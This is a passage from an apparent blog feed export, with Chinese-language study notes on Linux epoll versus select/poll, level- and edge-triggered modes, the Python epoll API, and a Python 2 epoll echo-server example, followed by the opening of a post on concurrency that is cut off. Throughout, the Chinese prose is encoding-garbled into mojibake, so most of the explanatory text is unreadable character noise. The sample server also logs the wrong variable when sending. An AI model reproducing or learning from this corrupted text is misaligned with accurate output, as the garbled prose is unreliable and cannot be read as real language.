å…¥æ–‡ä»¶æè¿°ç¬¦å’Œäº‹ä»¶ç±»å‹ã€‚ç„¶åé‡å¤5æ¬¡ï¼Œè¡¨æ˜ç›‘å¬5ä¸ªsocketæ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶åè°ƒç”¨<code>epoll_wait()</code>æ¥è¿›è¡Œé˜»å¡ç­‰å¾…ï¼Œç­‰å¾…å®Œåï¼Œåªéœ€è¦éå†<code>epoll_wait()</code>è¿”å›çš„åºå·è¿›è¡Œå¯¹åº”è¯»å–ã€‚ä¸éœ€è¦åƒpollä¸€æ ·é‡ç½®äº‹ä»¶ã€‚</p><h4 id="Epoll-vs-Select-Poll"><a href="#Epoll-vs-Select-Poll" class="headerlink" title="Epoll vs Select/Poll"></a><strong>Epoll vs Select/Poll</strong></h4><ul><li>We can add and remove file descriptor while waiting</li><li>epoll_wait returns only the objects with ready file descriptors</li><li>epoll has better performance â€“ O(1) instead of O(n)</li><li>epoll can behave as level triggered or edge triggered (see man page)</li><li>epoll is Linux specific so non portable</li></ul><p>å…¶å®<code>epoll_create()</code>åˆ›å»ºçš„æ˜¯ä¸€ä¸ªçº¢é»‘æ ‘ï¼Œ<code>epoll_ctl()</code>æ˜¯å¯¹çº¢é»‘æ ‘è¿›è¡Œæ“ä½œã€‚è¿™é‡Œçš„ç½®ä½æ“ä½œä¹Ÿæœ‰ä½†æ˜¯å’Œpoll()ä¸å¤ªä¸€æ ·ï¼Œå› ä¸ºepoll()æ²¡æœ‰reventsã€‚è¿™é‡Œå…·ä½“æ˜¯å¦‚ä½•æ“ä½œçš„å›å¤´å­¦äº†å†è¡¥ä¸Šï¼Œæˆ‘çœ‹çš„è§†é¢‘å¯¹è¿™ä¸ªéƒ¨åˆ†å…·ä½“å¦‚ä½•ç½®ä½æœ‰äº‰è®®ã€‚ç„¶åè¿˜æœ‰å°±æ˜¯ï¼Œè¿™ä¸ªç»™çš„ä¾‹å­æ˜¯epoll()çš„æ°´å¹³è§¦å‘è¿˜æœ‰ä¸€ç§è¾¹ç¼˜è§¦å‘ã€‚è¿™ä¸ªä¼¼ä¹æŒºå¤æ‚çš„è®°å½•å‡ ä¸ªè®²è¿™ä¸ªçš„urlã€‚å›å¤´å»çœ‹</p><p><a href="https://blog.csdn.net/qq_34793133/article/details/82055915">https://blog.csdn.net/qq_34793133/article/details/82055915</a></p><p><a href="https://zhuanlan.zhihu.com/p/107995399">https://zhuanlan.zhihu.com/p/107995399</a></p><p>å…·ä½“ç”¨cæ¥è¯´è®¾ç½®æ°´å¹³è§¦å‘å’Œè¾¹ç¼˜è§¦å‘æ˜¯åœ¨</p><pre><code class="c">//æ°´å¹³è§¦å‘evt.events = EPOLLIN;    // LT æ°´å¹³è§¦å‘ (é»˜è®¤) EPOLLLTevt.data.fd = pfd[0];//è¾¹æ²¿è§¦å‘evt.events = EPOLLIN | EPOLLET;    // ET è¾¹æ²¿è§¦å‘evt.data.fd = pfd[0];</code></pre><p>LT/ETåº”è¯¥å°±æ˜¯åˆ†åˆ«ä»£è¡¨ï¼ŒLevel Triggerå’ŒEdge Triggerï¼Œä¹Ÿå°±æ˜¯åœ¨è®¾ç½®äº‹ä»¶å’Œä¼ å…¥<code>epoll_ctl()</code>æ—¶è®¾ç½®ã€‚</p><p>è‡³äºè¿™ä¿©æœ‰å•¥åŒºåˆ«å’Œä»€ä¹ˆæ—¶å€™ç”¨ï¼Œä¸Šé¢æ”¾çš„ä¸¤ä¸ªurlä¸­CSDNçš„æ ‡é¢˜å°±æ˜¯<code>æµ…æepollçš„æ°´å¹³è§¦å‘å’Œè¾¹ç¼˜è§¦å‘ï¼Œä»¥åŠè¾¹ç¼˜è§¦å‘ä¸ºä»€ä¹ˆè¦ä½¿ç”¨éé˜»å¡IO</code>è¿™é‡Œå†å¼•ç”¨éƒ¨åˆ†ä½œè€…çš„æ–‡ç« å†…å®¹</p><pre><code>æˆ‘ä»¬é€šä¿—ä¸€ç‚¹è®²ï¼šLevel_triggered(æ°´å¹³è§¦å‘)ï¼šå½“è¢«ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦ä¸Šæœ‰å¯è¯»å†™äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œepoll_wait()ä¼šé€šçŸ¥å¤„ç†ç¨‹åºå»è¯»å†™ã€‚å¦‚æœè¿™æ¬¡æ²¡æœ‰æŠŠæ•°æ®ä¸€æ¬¡æ€§å…¨éƒ¨è¯»å†™å®Œ(å¦‚è¯»å†™ç¼“å†²åŒºå¤ªå°)ï¼Œé‚£ä¹ˆä¸‹æ¬¡è°ƒç”¨ epoll_wait()æ—¶ï¼Œå®ƒè¿˜ä¼šé€šçŸ¥ä½ åœ¨ä¸Šæ²¡è¯»å†™å®Œçš„æ–‡ä»¶æè¿°ç¬¦ä¸Šç»§ç»­è¯»å†™ï¼Œå½“ç„¶å¦‚æœä½ ä¸€ç›´ä¸å»è¯»å†™ï¼Œå®ƒä¼šä¸€ç›´é€šçŸ¥ä½ ï¼ï¼ï¼å¦‚æœç³»ç»Ÿä¸­æœ‰å¤§é‡ä½ ä¸éœ€è¦è¯»å†™çš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œå®ƒä»¬æ¯æ¬¡éƒ½ä¼šè¿”å›ï¼Œè¿™æ ·ä¼šå¤§å¤§é™ä½å¤„ç†ç¨‹åºæ£€ç´¢è‡ªå·±å…³å¿ƒçš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦çš„æ•ˆç‡ï¼ï¼ï¼Edge_triggered(è¾¹ç¼˜è§¦å‘)ï¼šå½“è¢«ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦ä¸Šæœ‰å¯è¯»å†™äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œepoll_wait()ä¼šé€šçŸ¥å¤„ç†ç¨‹åºå»è¯»å†™ã€‚å¦‚æœè¿™æ¬¡æ²¡æœ‰æŠŠæ•°æ®å…¨éƒ¨è¯»å†™å®Œ(å¦‚è¯»å†™ç¼“å†²åŒºå¤ªå°)ï¼Œé‚£ä¹ˆä¸‹æ¬¡è°ƒç”¨epoll_wait()æ—¶ï¼Œå®ƒä¸ä¼šé€šçŸ¥ä½ ï¼Œä¹Ÿå°±æ˜¯å®ƒåªä¼šé€šçŸ¥ä½ ä¸€æ¬¡ï¼Œç›´åˆ°è¯¥æ–‡ä»¶æè¿°ç¬¦ä¸Šå‡ºç°ç¬¬äºŒæ¬¡å¯è¯»å†™äº‹ä»¶æ‰ä¼šé€šçŸ¥ä½ ï¼ï¼ï¼è¿™ç§æ¨¡å¼æ¯”æ°´å¹³è§¦å‘æ•ˆç‡é«˜ï¼Œç³»ç»Ÿä¸ä¼šå……æ–¥å¤§é‡ä½ ä¸å…³å¿ƒçš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦ï¼ï¼ï¼é˜»å¡IOï¼šå½“ä½ å»è¯»ä¸€ä¸ªé˜»å¡çš„æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œå¦‚æœåœ¨è¯¥æ–‡ä»¶æè¿°ç¬¦ä¸Šæ²¡æœ‰æ•°æ®å¯è¯»ï¼Œé‚£ä¹ˆå®ƒä¼šä¸€ç›´é˜»å¡(é€šä¿—ä¸€ç‚¹å°±æ˜¯ä¸€ç›´å¡åœ¨è°ƒç”¨å‡½æ•°é‚£é‡Œ)ï¼Œç›´åˆ°æœ‰æ•°æ®å¯è¯»ã€‚å½“ä½ å»å†™ä¸€ä¸ªé˜»å¡çš„æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œå¦‚æœåœ¨è¯¥æ–‡ä»¶æè¿°ç¬¦ä¸Šæ²¡æœ‰ç©ºé—´(é€šå¸¸æ˜¯ç¼“å†²åŒº)å¯å†™ï¼Œé‚£ä¹ˆå®ƒä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æœ‰ç©ºé—´å¯å†™ã€‚ä»¥ä¸Šçš„è¯»å’Œå†™æˆ‘ä»¬ç»Ÿä¸€æŒ‡åœ¨æŸä¸ªæ–‡ä»¶æè¿°ç¬¦è¿›è¡Œçš„æ“ä½œï¼Œä¸å•å•æŒ‡çœŸæ­£çš„è¯»æ•°æ®ï¼Œå†™æ•°æ®ï¼Œè¿˜åŒ…æ‹¬æ¥æ”¶è¿æ¥accept()ï¼Œå‘èµ·è¿æ¥connect()ç­‰æ“ä½œ...éé˜»å¡IOï¼šå½“ä½ å»è¯»å†™ä¸€ä¸ªéé˜»å¡çš„æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œä¸ç®¡å¯ä¸å¯ä»¥è¯»å†™ï¼Œå®ƒéƒ½ä¼šç«‹å³è¿”å›ï¼Œè¿”å›æˆåŠŸè¯´æ˜è¯»å†™æ“ä½œå®Œæˆäº†ï¼Œè¿”å›å¤±è´¥ä¼šè®¾ç½®ç›¸åº”errnoçŠ¶æ€ç ï¼Œæ ¹æ®è¿™ä¸ªerrnoå¯ä»¥è¿›ä¸€æ­¥æ‰§è¡Œå…¶ä»–å¤„ç†ã€‚å®ƒä¸ä¼šåƒé˜»å¡IOé‚£æ ·ï¼Œå¡åœ¨é‚£é‡Œä¸åŠ¨ï¼ï¼ï¼</code></pre><p>å†çœ‹Pythonå®˜æ–¹æ–‡æ¡£å¯¹epollçš„ä»‹ç»</p><h2 id="Edge-and-Level-Trigger-Polling-epoll-Objects"><a href="#Edge-and-Level-Trigger-Polling-epoll-Objects" class="headerlink" title="Edge and Level Trigger Polling (epoll) Objects"></a>Edge and Level Trigger Polling (epoll) Objects</h2><blockquote><p><a href="https://linux.die.net/man/4/epoll">https://linux.die.net/man/4/epoll</a></p><p><em>eventmask</em></p><table><thead><tr><th>Constant</th><th>Meaning</th></tr></thead><tbody><tr><td><code>EPOLLIN</code></td><td>Available for read</td></tr><tr><td><code>EPOLLOUT</code></td><td>Available for write</td></tr><tr><td><code>EPOLLPRI</code></td><td>Urgent data for read</td></tr><tr><td><code>EPOLLERR</code></td><td>Error condition happened on the assoc. fd</td></tr><tr><td><code>EPOLLHUP</code></td><td>Hang up happened on the assoc. fd</td></tr><tr><td><code>EPOLLET</code></td><td>Set Edge Trigger behavior, the default is Level Trigger behavior</td></tr><tr><td><code>EPOLLONESHOT</code></td><td>Set one-shot behavior. After one event is pulled out, the fd is internally disabled</td></tr><tr><td><code>EPOLLEXCLUSIVE</code></td><td>Wake only one epoll object when the associated fd has an event. The default (if this flag is not set) is to wake all epoll objects polling on a fd.</td></tr><tr><td><code>EPOLLRDHUP</code></td><td>Stream socket peer closed connection or shut down writing half of connection.</td></tr><tr><td><code>EPOLLRDNORM</code></td><td>Equivalent to <code>EPOLLIN</code></td></tr><tr><td><code>EPOLLRDBAND</code></td><td>Priority data band can be read.</td></tr><tr><td><code>EPOLLWRNORM</code></td><td>Equivalent to <code>EPOLLOUT</code></td></tr><tr><td><code>EPOLLWRBAND</code></td><td>Priority data may be written.</td></tr><tr><td><code>EPOLLMSG</code></td><td>Ignored.</td></tr></tbody></table><p>New in version 3.6: <code>EPOLLEXCLUSIVE</code> was added.  Itâ€™s only supported by Linux Kernel 4.5 or later.</p></blockquote><ul><li><p><code>epoll.close()</code></p><p>Close the control file descriptor of the epoll object.</p></li><li><p><code>epoll.closed()</code></p><p>True if the epoll object is closed.</p></li><li><p><code>epoll.fileno()</code></p><p>Return the file descriptor number of the control fd.</p></li><li><p><code>epoll.fromfd</code>(<em>fd</em>)</p><p>Create an epoll object from a given file descriptor.</p></li><li><p><code>epoll.register</code>(<em>fd</em>[, <em>eventmask</em>])</p><p>Register a fd descriptor with the epoll object.</p></li><li><p><code>epoll.modify</code>(<em>fd</em>, <em>eventmask</em>)</p><p>Modify a registered file descriptor.</p></li><li><p><code>epoll.unregister</code>(<em>fd</em>)</p><p>Remove a registered file descriptor from the epoll object. Changed in version 3.9: The method no longer ignores the <a href="https://docs.python.org/3/library/errno.html#errno.EBADF"><code>EBADF</code></a> error.</p></li><li><p><code>epoll.poll</code>(<em>timeout=None</em>, <em>maxevents=-1</em>)</p><p>Wait for events. timeout in seconds (float)</p><p>æ„Ÿè§‰æœ‰ç‚¹æŠ½è±¡ï¼Œçœ‹ä¸€ä¸ªæ ·ä¾‹ä»£ç å§</p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import socket, selectimport Queueserversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server_address = (&quot;192.168.1.5&quot;, 8080)serversocket.bind(server_address)serversocket.listen(1)print  &quot;æœåŠ¡å™¨å¯åŠ¨æˆåŠŸï¼Œç›‘å¬IPï¼š&quot; , server_addressserversocket.setblocking(0)timeout = 10#æ–°å»ºepolläº‹ä»¶å¯¹è±¡ï¼Œåç»­è¦ç›‘æ§çš„äº‹ä»¶æ·»åŠ åˆ°å…¶ä¸­epoll = select.epoll()#æ·»åŠ æœåŠ¡å™¨ç›‘å¬fdåˆ°ç­‰å¾…è¯»äº‹ä»¶é›†åˆepoll.register(serversocket.fileno(), select.EPOLLIN)message_queues = &#123;&#125;fd_to_socket = &#123;serversocket.fileno():serversocket,&#125;while True:  print &quot;ç­‰å¾…æ´»åŠ¨è¿æ¥......&quot;  #è½®è¯¢æ³¨å†Œçš„äº‹ä»¶é›†åˆ  events = epoll.poll(timeout)  if not events:     print &quot;epollè¶…æ—¶æ— æ´»åŠ¨è¿æ¥ï¼Œé‡æ–°è½®è¯¢......&quot;     continue  print &quot;æœ‰&quot; , len(events), &quot;ä¸ªæ–°äº‹ä»¶ï¼Œå¼€å§‹å¤„ç†......&quot;  for fd, event in events:     socket = fd_to_socket[fd]     #å¯è¯»äº‹ä»¶     if event &amp; select.EPOLLIN:         #å¦‚æœæ´»åŠ¨socketä¸ºæœåŠ¡å™¨æ‰€ç›‘å¬ï¼Œæœ‰æ–°è¿æ¥         if socket == serversocket:            connection, address = serversocket.accept()            print &quot;æ–°è¿æ¥ï¼š&quot; , address            connection.setblocking(0)            #æ³¨å†Œæ–°è¿æ¥fdåˆ°å¾…è¯»äº‹ä»¶é›†åˆ            epoll.register(connection.fileno(), select.EPOLLIN)            fd_to_socket[connection.fileno()] = connection            message_queues[connection]  = Queue.Queue()         #å¦åˆ™ä¸ºå®¢æˆ·ç«¯å‘é€çš„æ•°æ®         else:            data = socket.recv(1024)            if data:               print &quot;æ”¶åˆ°æ•°æ®ï¼š&quot; , data , &quot;å®¢æˆ·ç«¯ï¼š&quot; , socket.getpeername()               message_queues[socket].put(data)               #ä¿®æ”¹è¯»å–åˆ°æ¶ˆæ¯çš„è¿æ¥åˆ°ç­‰å¾…å†™äº‹ä»¶é›†åˆ               epoll.modify(fd, select.EPOLLOUT)     #å¯å†™äº‹ä»¶     elif event &amp; select.EPOLLOUT:        try:           msg = message_queues[socket].get_nowait()        except Queue.Empty:           print socket.getpeername() , &quot; queue empty&quot;           epoll.modify(fd, select.EPOLLIN)        else :           print &quot;å‘é€æ•°æ®ï¼š&quot; , data , &quot;å®¢æˆ·ç«¯ï¼š&quot; , socket.getpeername()           socket.send(msg)     #å…³é—­äº‹ä»¶     elif event &amp; select.EPOLLHUP:        epoll.unregister(fd)        fd_to_socket[fd].close()        del fd_to_socket[fd]epoll.unregister(serversocket.fileno())epoll.close()serversocket.close()</code></pre></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»ç»“å°±æ˜¯ï¼Œè‡³å°‘åœ¨pythonä¸‹selectçš„å…¼å®¹æ€§æ¯”è¾ƒå¥½ï¼Œåœ¨Linuxå’ŒWinä¸‹éƒ½æ˜¯é€šç”¨çš„ã€‚ç„¶åä¸€èˆ¬æ¥è¯´pollå’Œepollç”¨çš„æ¯”selectå¤šã€‚å› ä¸ºåœ¨å¾ˆå¤šæ–¹é¢è¿™ä¿©éƒ½æ¯”selectæ›´å¥½ã€‚åŒæ—¶æˆ‘ä¹Ÿäº†è§£åˆ°äº†æ•°æ®ç»“æ„çš„å®é™…åº”ç”¨ï¼Œå› ä¸ºpollå’Œepollä¸­åº”ç”¨äº†bitmap çº¢é»‘æ ‘å’Œé“¾è¡¨ã€‚è¿™å…¶ä¸­æˆ‘ä¼šåœ¨ä»¥åè¿›è¡Œç ”ç©¶å¹¶å‘blogè®°å½•å­¦ä¹ äº†è§£è¿™å‡ ç§æ•°æ®ç»“æ„å¹¶æ€è€ƒé‡‡ç”¨è¿™äº›ç»“æ„çš„åŸå› ã€‚epollè¢«åº”ç”¨åœ¨Nginxå’ŒRedisè¿™è¡¨æ˜å…¶ç»“æ„æ˜¯ä¼˜ç§€çš„ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯è€ƒè™‘é‡‡ç”¨epollã€‚åŒæ—¶epollä¹Ÿé‡‡ç”¨äº†è§‚å¯Ÿè€…çš„è®¾è®¡æ¨¡å¼ï¼Œè¿™ä¸ªå›å¤´ä¹Ÿå¯ä»¥äº†è§£ã€‚</p><h2 id="To-do"><a href="#To-do" class="headerlink" title="To do"></a>To do</h2><ul><li>äº†è§£å‡ ç§æ•°æ®ç»“æ„åŒ…æ‹¬é“¾è¡¨ï¼Œçº¢é»‘æ ‘ï¼Œbitmap</li><li>æ›´è¿›ä¸€æ­¥äº†è§£epollçš„ç”¨æ³•ï¼ŒåŒ…å«å…¶æ°´å¹³è§¦å‘å’Œè¾¹ç¼˜è§¦å‘</li><li>åŠ¨æ‰‹è‡ªå·±å°è¯•ç”¨è¿™å‡ ä¸ªæ¨¡å‹</li><li>äº†è§£epollçš„è§‚å¯Ÿè€…è®¾è®¡æ¨¡å¼</li><li>ä»æ•°æ®ç»“æ„è§£é‡Šepollæ¯”pollæ›´æœ‰ä¼˜åŠ¿çš„åŸå› </li><li>å¯¹UNIXç³»ç»Ÿçš„æ–‡ä»¶æè¿°ç¬¦åšæ›´æ·±å…¥çš„äº†è§£</li></ul><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p>Python Selectå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.python.org/3/library/select.html">https://docs.python.org/3/library/select.html</a></p><p>select/poll/epollè§†å±è®²è§£ï¼ˆè®²çš„å¾ˆå¥½ï¼‰:<a href="https://www.bilibili.com/video/BV1qJ411w7du?from=search&amp;seid=10159331074298299316">https://www.bilibili.com/video/BV1qJ411w7du?from=search&amp;seid=10159331074298299316</a></p><p>select/poll/epoll Pythonä»£ç æ ·ä¾‹:<a href="https://www.cnblogs.com/muzinan110/p/5004469.html">https://www.cnblogs.com/muzinan110/p/5004469.html</a> P.Sè™½ç„¶æ˜¯Python2ä½†æ˜¯æ— ä¼¤å¤§é›…</p><p>select/poll/epollåŒºåˆ«å’ŒCä»£ç æ ·ä¾‹:<a href="https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/#.YI50iKERUUH">https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/#.YI50iKERUUH</a></p><p>I/Oæ ·ä¾‹å›¾ï¼š<a href="https://www.yuque.com/gotaoey/vaeroo/iqdfgh%E5%92%8C%E5%AF%B9%E5%BA%94%E8%A7%86%E9%A2%91%E8%AE%B2%E8%A7%A3https://www.bilibili.com/video/BV1vv4y1o7pu/?spm_id_from=333.788.recommend_more_video.0">https://www.yuque.com/gotaoey/vaeroo/iqdfghå’Œå¯¹åº”è§†é¢‘è®²è§£https://www.bilibili.com/video/BV1vv4y1o7pu/?spm_id_from=333.788.recommend_more_video.0</a></p><p>è¿˜æœ‰å¾ˆå¤šå¼•ç”¨åœ¨æ–‡ä¸­å·²ç»æŒ‡å‡ºï¼Œç”±äºå¼•ç”¨èµ„æ–™è¾ƒå¤šæ­¤å¤„åˆ—ä¸¾æœªå®Œæ•¬è¯·è°…è§£</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘æ­£åœ¨å†™ä¸€ä¸ªç«¯å£æ˜ å°„å°ç¨‹åºã€‚ä¸»è¦å®ç°å†…ç½‘çš„ç«¯å£è½¬å‘åŠŸèƒ½ã€‚æ‹¿80ç«¯å£çš„Apacheä¸¾ä¾‹æ¥è¯´ï¼Œå°±æ˜¯æˆ‘åœ¨ä¸€ä¸ªæ²¡æœ‰å…¬ç½‘IPçš„å†…ç½‘å»ºç«‹äº†ä¸€ä¸ªApac</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>å¹¶è¡Œç¼–ç¨‹å­¦ä¹ </title>
    <link href="https://zwh-china.github.io/2021/04/19/%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    <id>https://zwh-china.github.io/2021/04/19/%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-04-18T18:32:29.000Z</published>
    <updated>2021-04-27T11:25:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”±äºæˆ‘çš„pythonåŸºç¡€éƒ¨åˆ†å·²ç»è‡ªå­¦å®Œï¼Œä¹Ÿå†™è¿‡ä¸€äº›å¾ˆç®€å•çš„å°é¡¹ç›®ã€‚æ‰€ä»¥æˆ‘æƒ³å¯»æ‰¾ä¸€ç§æ–¹å¼æ¥æå‡ä¸€ä¸‹æˆ‘ç¼–ç¨‹çš„æ°´å¹³ã€‚åœ¨æ¥è§¦socketç¼–ç¨‹æ—¶ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°äº†å¤šçº¿ç¨‹è¿™ä¸ªæ¦‚å¿µã€‚å…·ä½“åœºæ™¯å°±æ˜¯éœ€è¦ä¸€ä¸ªUDPç›‘å¬å‡½æ•°åœ¨åå°è¿è¡Œï¼Œä½†æ˜¯é»˜è®¤ä¸‹åœ¨ä¸»å‡½æ•°è°ƒç”¨ä¸€ä¸ªå‡½æ•°åï¼Œä¸»å‡½æ•°ä¼šå¤„äºä¸€ä¸ªæŒ‚èµ·çŠ¶æ€ï¼Œåœ¨è¿è¡Œå®Œå‡½æ•°åï¼Œmainå‡½æ•°æ‰èƒ½ç»§ç»­å‘ä¸‹è¿è¡Œã€‚è¿™ä¸ªè¿‡ç¨‹ä¹Ÿå«ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ä½†æ˜¯æˆ‘çš„éœ€æ±‚æ˜¯UDPåœ¨æ•´ä¸ªç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸéƒ½å¿…é¡»åœ¨åå°è¿è¡Œã€‚å› æ­¤ä¹Ÿå°±å»äº†è§£äº†å¤šçº¿ç¨‹ï¼Œå¤šè¿›ç¨‹ç¼–ç¨‹æŠ€æœ¯ã€‚è¿›è€Œæˆ‘æƒ³ç›¸å¯¹ç³»ç»Ÿå’Œæ·±å…¥çš„äº†è§£è¿™æ–¹é¢çš„çŸ¥è¯†ã€‚</p><h3 id="1-1-é¦–å…ˆæˆ‘å»äº†è§£äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯å¹¶å‘ï¼Œå¹¶è¡Œï¼Œä¸²è¡Œï¼ŒåŒæ­¥ï¼Œå¼‚æ­¥"><a href="#1-1-é¦–å…ˆæˆ‘å»äº†è§£äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯å¹¶å‘ï¼Œå¹¶è¡Œï¼Œä¸²è¡Œï¼ŒåŒæ­¥ï¼Œå¼‚æ­¥" class="headerlink" title="1-1 é¦–å…ˆæˆ‘å»äº†è§£äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯å¹¶å‘ï¼Œå¹¶è¡Œï¼Œä¸²è¡Œï¼ŒåŒæ­¥ï¼Œå¼‚æ­¥"></a>1-1 é¦–å…ˆæˆ‘å»äº†è§£äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯å¹¶å‘ï¼Œå¹¶è¡Œï¼Œä¸²è¡Œï¼ŒåŒæ­¥ï¼Œå¼‚æ­¥</h3><p>å¤åˆ¶ç²˜è´´ä¸€ä¸‹CSDNæ–‡ç« </p><p>1.å¹¶å‘ç¼–ç¨‹åˆå«å¤šçº¿ç¨‹ç¼–ç¨‹ã€‚</p><pre><code>   åœ¨ç¨‹åºä¸­ï¼Œå¾€å¾€æœ‰å¾ˆå¤šå¾ˆè€—æ—¶çš„å·¥ä½œï¼Œæ¯”å¦‚ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ã€è·Ÿå®¢æˆ·èŠå¤©éœ€è¦é•¿æ—¶é—´å»ºç«‹è¿æ¥ã€‚è¿™ç§æ—¶å€™ï¼Œä¸€ä¸ªçº¿ç¨‹æ˜¯æœåŠ¡ä¸äº†å¤šä¸ªç”¨æˆ·çš„ï¼Œä¼šäº§ç”Ÿå› ä¸ºèµ„æºç‹¬å äº§ç”Ÿçš„ç­‰å¾…é—®é¢˜ã€‚å¹¶å‘çš„å®è´¨æ˜¯ä¸€ä¸ªç‰©ç†CPU(ä¹Ÿå¯ä»¥å¤šä¸ªç‰©ç†CPU) åœ¨è‹¥å¹²é“ç¨‹åºä¹‹é—´å¤šè·¯å¤ç”¨ï¼Œå¹¶å‘æ€§æ˜¯å¯¹æœ‰é™ç‰©ç†èµ„æºå¼ºåˆ¶è¡Œä½¿å¤šç”¨æˆ·å…±äº«ä»¥æé«˜æ•ˆç‡ã€‚(å¹¶å‘æŒ‡çš„æ˜¯ä»»åŠ¡æ•°å¤šä½™cpuæ ¸æ•°ï¼Œé€šè¿‡æ“ä½œç³»ç»Ÿçš„å„ç§ä»»åŠ¡è°ƒåº¦ç®—æ³•ï¼Œå®ç°ç”¨å¤šä¸ªä»»åŠ¡â€œä¸€èµ·â€æ‰§è¡Œï¼ˆå®é™…ä¸Šæ€»æœ‰ä¸€äº›ä»»åŠ¡ä¸åœ¨æ‰§è¡Œï¼Œå› ä¸ºåˆ‡æ¢ä»»åŠ¡çš„é€Ÿåº¦ç›¸å½“å¿«ï¼Œçœ‹ä¸Šå»ä¸€èµ·æ‰§è¡Œè€Œå·²ï¼‰ï¼‰å¹¶å‘å½“æœ‰å¤šä¸ªçº¿ç¨‹åœ¨æ“ä½œæ—¶,å¦‚æœç³»ç»Ÿåªæœ‰ä¸€ä¸ªCPU,åˆ™å®ƒæ ¹æœ¬ä¸å¯èƒ½çœŸæ­£åŒæ—¶è¿›è¡Œä¸€ä¸ªä»¥ä¸Šçš„çº¿ç¨‹ï¼Œå®ƒåªèƒ½æŠŠCPUè¿è¡Œæ—¶é—´åˆ’åˆ†æˆè‹¥å¹²ä¸ªæ—¶é—´æ®µ,å†å°†æ—¶é—´ æ®µåˆ†é…ç»™å„ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œåœ¨ä¸€ä¸ªæ—¶é—´æ®µçš„çº¿ç¨‹ä»£ç è¿è¡Œæ—¶ï¼Œå…¶å®ƒçº¿ç¨‹å¤„äºæŒ‚èµ·çŠ¶ã€‚.è¿™ç§æ–¹å¼æˆ‘ä»¬ç§°ä¹‹ä¸ºå¹¶å‘(Concurrent)ã€‚</code></pre><p>2.â€œå¹¶è¡Œâ€æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šäº‹ä»¶æˆ–æ´»åŠ¨åœ¨åŒä¸€æ—¶åˆ»å‘ç”Ÿã€‚åœ¨å¤šé“ç¨‹åºç¯å¢ƒä¸‹ï¼Œå¹¶è¡Œæ€§ä½¿å¤šä¸ªç¨‹åºåŒä¸€æ—¶åˆ»å¯åœ¨ä¸åŒCPUä¸ŠåŒæ—¶æ‰§è¡Œã€‚ï¼ˆhadoopé›†ç¾¤å°±æ˜¯å¹¶è¡Œè®¡ç®—çš„ï¼‰</p><pre><code> å½“ç³»ç»Ÿæœ‰ä¸€ä¸ªä»¥ä¸ŠCPUæ—¶,åˆ™çº¿ç¨‹çš„æ“ä½œæœ‰å¯èƒ½éå¹¶å‘ã€‚å½“ä¸€ä¸ªCPUæ‰§è¡Œä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œå¦ä¸€ä¸ªCPUå¯ä»¥æ‰§è¡Œå¦ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸¤ä¸ªçº¿ç¨‹äº’ä¸æŠ¢å 